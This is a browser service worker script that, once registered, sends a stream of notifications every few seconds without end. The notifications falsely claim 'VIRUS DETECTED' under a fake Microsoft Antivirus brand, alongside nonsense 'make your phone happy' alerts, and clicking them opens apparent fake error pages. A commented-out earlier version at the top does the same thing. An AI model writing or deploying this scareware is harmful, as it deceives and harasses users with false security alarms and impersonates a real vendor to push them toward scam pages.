/* self.addEventListener("install", () => self.skipWaiting());

self.addEventListener("activate", (event) => {
  event.waitUntil(self.clients.claim());
});

setInterval(() => {
  self.registration.showNotification("Remove Threats Now!", {
    body: "VIRUS DETECTED. REMOVE THREATS NOW WITH MICROSOFT ANTIVIRUS",
    icon: "https://cdn.glitch.global/cbb58682-7814-4e21-a791-7965cc901a5b/Microsoft%20Antivirus.png",
  });
  self.registration.showNotification("Make your phone happy.", {
    body: "MAKE YOUR PHONE HAPPY NOW. IT IS VERY IMPORTANT. MAKE PHONE HAPPY NOW.",
    icon: "https://cdn.glitch.global/cbb58682-7814-4e21-a791-7965cc901a5b/OpuaYT.webp",
  });
}, 1500);

setInterval(() => {
  self.registration.showNotification("Make your phone happy.", {
    body: "MAKE YOUR PHONE HAPPY NOW. IT IS VERY IMPORTANT. MAKE PHONE HAPPY NOW.",
    icon: "https://cdn.glitch.global/cbb58682-7814-4e21-a791-7965cc901a5b/OpuaYT.webp",
  });
}, 4000); */

self.addEventListener("install", (e) => self.skipWaiting());
self.addEventListener("activate", (e) => e.waitUntil(self.clients.claim()));

self.addEventListener('notificationclick', (e) => {
  e.notification.close();
  const action = e.action;
  const data = e.notification.data;

  if (action) {
    const url = data.actionUrls?.[action];
    if (url) e.waitUntil(clients.openWindow(url));
  } else if (data.url) {
    e.waitUntil(clients.openWindow(data.url));
  }
});

function showRandomNotification() {
  const notifications = [
    {
      title: "Remove Threats Now!",
      body: "VIRUS DETECTED. REMOVE THREATS NOW WITH MICROSOFT ANTIVIRUS",
      icon: "https://cdn.glitch.global/cbb58682-7814-4e21-a791-7965cc901a5b/Microsoft%20Antivirus.png",
      url: "../nnm-ae/1000/gb20-aderror.html",
      actions: [
        { action: "scan", title: "🛡️ Scan Now" }
      ],
      actionUrls: {
        scan: "../nnm-ae/1000/gb20-aderror.html",
      }
    },
    {
      title: "Make your phone happy.",
      body: "MAKE YOUR PHONE HAPPY NOW. IT IS VERY IMPORTANT.",
      icon: "https://cdn.glitch.global/cbb58682-7814-4e21-a791-7965cc901a5b/OpuaYT.webp",
      url: "../pages/happyphone.html",
      actions: [
        { action: "happy", title: "📱 Make it Happy"}
      ],
      actionUrls: {
        scan: "../pages/happyphone.html"
      }
    }
  ];

  const randomNotif = notifications[Math.floor(Math.random() * notifications.length)];
  const delay = Math.random() * 8800 + 1200;

  self.registration.showNotification(randomNotif.title, {
    body: randomNotif.body,
    icon: randomNotif.icon,
    actions: randomNotif.actions,
    data: {
      url: randomNotif.url,
      actionUrls: randomNotif.actionUrls
    }
  });

  setTimeout(showRandomNotification, delay);
}

setTimeout(showRandomNotification, Math.random() * 8800 + 1200);